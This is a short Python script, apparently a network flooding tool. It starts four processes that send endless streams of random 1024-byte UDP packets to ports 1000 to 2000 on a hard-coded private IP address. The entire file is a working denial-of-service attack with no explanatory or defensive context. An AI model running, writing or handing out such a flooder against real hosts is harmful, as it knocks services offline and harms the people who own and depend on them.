import random
import socket
from multiprocessing import Process
import os

ip = "172.16.3.197"
udp = True
portr = (1000, 2000)
times = 1000
threads = 4


def flood():
	data = random._urandom(1024)
	while True:
		port = random.randint(*portr)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
			addr = (str(ip), int(port))
			for _ in range(times):
				s.sendto(data, addr)
			print("Sent to " + str(port) + " process " + str(os.getpid()))
		except Exception as err:
			print("Error " + str(err))


if __name__ == '__main__':
	for _ in range(threads):
		Process(target=flood).start()
